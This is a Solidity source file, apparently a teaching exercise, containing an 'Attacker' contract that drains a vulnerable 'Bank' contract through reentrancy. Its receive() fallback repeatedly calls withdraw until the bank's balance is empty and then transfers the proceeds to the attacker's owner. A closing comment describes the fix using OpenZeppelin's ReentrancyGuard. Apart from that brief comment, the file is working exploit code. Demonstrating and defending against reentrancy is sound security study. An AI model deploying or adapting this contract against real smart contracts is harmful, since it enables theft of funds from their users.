// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IBank
{
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker is Ownable
{
    IBank public immutable bank;
    constructor(address _bank)
    {
        bank = IBank(_bank);
    }

    function attack() external payable onlyOwner
    {
        //deposit 
        bank.deposit{value : msg.value}();

        //withdraw
        bank.withdraw();

    }

    receive() external payable 
    {
        if(address(bank).balance > 0)
        {
            bank.withdraw();
        }
        else 
        {
            payable(owner()).transfer(address(this).balance);
        }
    }
}

/*
To fix reentrancy attack you need to do this thing in the Bank.sol 

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
and them
external nonReentrant to every method 
and is ReentrancyGuard to the contract

*/
